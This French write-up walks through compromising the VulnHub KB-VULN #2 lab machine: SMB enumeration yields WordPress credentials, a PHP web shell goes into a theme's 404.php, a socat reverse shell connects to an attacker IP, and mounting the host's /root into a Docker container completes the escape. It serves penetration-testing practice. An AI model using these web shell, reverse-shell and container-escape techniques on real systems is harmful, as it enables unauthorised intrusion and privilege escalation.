# Solution du CTF KB-VULN #2 de VulnHub

2 Rapides
---------

Voici donc [la suite](https://www.vulnhub.com/entry/kb-vuln-2,562/) du précédent CTF de la série.  

Un scan de port remonte du Samba et du Apache :  

```plain
Nmap scan report for 192.168.56.6
Host is up (0.00032s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:99:01:23:fe:c4:84:ef:14:55:87:da:a3:30:6f:50 (RSA)
|   256 cb:8e:e1:b3:3a:6e:64:9e:0f:53:39:7e:18:9d:8b:3f (ECDSA)
|_  256 ec:3b:d9:53:4a:5a:f7:32:f2:3a:f7:a7:6f:31:87:52 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 08:00:27:03:F4:A4 (Oracle VirtualBox virtual NIC)
Service Info: Host: UBUNTU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2021-12-07T12:23:16
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: kb-server
|   NetBIOS computer name: UBUNTU\x00
|   Domain name: \x00
|   FQDN: kb-server
```

Sur le serveur web on trouve via énumération des dossiers un wordpress installé. Le module *wp\_enum* de *Wapiti* détecte quelques plugins et thèmes mais rien de critique :  

```plain
[*] Lancement du module wp_enum
Enumération des extensions WordPress :
akismet 4.1.6 détecté
----
Enumération des thèmes WordPress :
twentytwenty 1.5 détecté
twentyseventeen  détecté
twentynineteen 1.7 détecté
```

Avec l'aide de *wpscan* j'obtiens la version du Wordpress :  

```plain
[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.56.6/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.56.6/wordpress/, Match: 'WordPress 5.5.1'
```

Là encore rien de critique. Direction Samba sur lequel on trouve un disque partagé avec une archive zip :  

```bash
$ smbclient  -U "" -N -L //192.168.56.6

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      OPEN YOUR EYES!
        IPC$            IPC       IPC Service (Samba Server 4.7.6-Ubuntu)
SMB1 disabled -- no workgroup available

$ smbclient  -U "" -N //192.168.56.6/Anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 17 12:58:56 2020
  ..                                  D        0  Wed Sep 16 12:36:09 2020
  backup.zip                          N 16735117  Thu Sep 17 12:58:56 2020

                14380040 blocks of size 1024. 8346256 blocks available
smb: \> lcd /tmp
smb: \> get backup.zip
getting file \backup.zip of size 16735117 as backup.zip (80905,3 KiloBytes/sec) (average 80905,4 KiloBytes/sec)
```

A l'intérieur on trouve entre autres un fichier *remember\_me.txt* avec le contenu suivant :  

```plain
Username:admin
Password:MachineBoy141
```

Il y a aussi les identifiants de base de données dans la configuration du Wordpress :  

```php
define( 'DB_NAME', 'wordpress_db' );                                                                                   

/** MySQL database username */                                                                                         
define( 'DB_USER', 'kb_vuln' );                                                                                        

/** MySQL database password */                                                                                         
define( 'DB_PASSWORD', 'hellelujah' );
```

Le mot de passe *MachineBoy141* ne permet pas un accès sur SSH / SMB mais permet d'accéder à la zone d'administration du Wordpress.  

La technique habituelle consiste à éditer un fichier PHP via l'interface de Wordpress. On peut éditer les fichiers des thèmes installés mais tous ne permettent pas la modification (en raison des permissions sur les fichiers).  

Finalement j'ai édité le fichier *wp-content/themes/twentynineteen/404.php* pour y mettre le code suivant au début :  

```php
if (isset($_GET["cmd"])) { echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; }
```

2 Furieux
---------

D'après les interfaces réseau on est dans un Docker :  

```plain
3: docker0:  mtu 1500 qdisc noqueue state DOWN group default 
 link/ether 02:42:21:e3:e8:8c brd ff:ff:ff:ff:ff:ff
 inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
 valid\_lft forever preferred\_lft forever
```

*socat* est présent alors j'en profite pour récupérer un reverse shell avec PTY.  

Côté attaquant : 
```bash
socat file:`tty`,raw,echo=0 TCP-L:4242
```

Côté victime : 
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

En réutilisant les identifiants SQL je fouille dans le serveur MySQL local mais je ne trouve rien d'intéressant.  

Il y a un utilisateur *kbadmin* sur la machine et il utilise le même mot de passe que le Wordpress (*MachineBoy141*) on peut accéder au compte via la commande *su*.  

On peut se connecter aussi directement via SSH mais le service est dans le container donc aucun gain.  

L'utilisateur a des autorisations *sudo* pour passer root :  

```plain
kbadmin@kb-server:/$ sudo -l
[sudo] password for kbadmin: 
Matching Defaults entries for kbadmin on kb-server:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kbadmin may run the following commands on kb-server:
    (ALL : ALL) ALL

root@kb-server:~# cat flag.txt 
dc387b4cf1a4143f562dd1bdb3790ff1
```

Toutefois on est toujours dans le container, il est temps de s'échapper. Là encore on va employer une technique classique d'escalade de privilèges via Docker consistant à monter le disque de l'hôte dans le container.  

[Voir ici](https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html) pour plus d'informations sur les risques de lancer un container Docker avec privilèges.  

Mon problème est que la VM n'a pas d'accès Internet, je ne peux donc pas faire un simple Docker pull. A la place je vais créer une archive d'une image Alpine Linux pour la copier ensuite dans la VM.  

```bash
$ docker pull alpine
Using default tag: latest
latest: Pulling from library/alpine
59bf1c3509f3: Pull complete 
Digest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300
Status: Downloaded newer image for alpine:latest
docker.io/library/alpine:latest

$ docker images -a
REPOSITORY          TAG       IMAGE ID       CREATED        SIZE
alpine              latest    c059bfaa849c   12 days ago    5.58MB

$ docker save --output alpine.tar c059bfaa849c
```

Ensuite je charge l'image et l'exécute en montant le */root* de l'hôte :  

```bash
kbadmin@kb-server:~$ docker load --input alpine.tar
8d3ac3489996: Loading layer [==================================================>]  5.866MB/5.866MB
Loaded image ID: sha256:c059bfaa849c4d8e4aecaeb3a10c2d9b3d85f5165c66ad3a4d937758128c4d18

kbadmin@kb-server:~$ docker run -it -v /root:/real_root sha256:c059bfaa849c4d8e4aecaeb3a10c2d9b3d85f5165c66ad3a4d937758128c4d18
/ # ls /
bin        dev        etc        home       lib        media      mnt        opt        proc       real_root  root       run        sbin       srv        sys        tmp        usr        var
/ # ls /real_root/
flag.txt
/ # cd /real_root/
/real_root # cat flag.txt 
dc387b4cf1a4143f562dd1bdb3790ff1
```

Evalal'travail !  


*Published December 08 2021 at 12:07*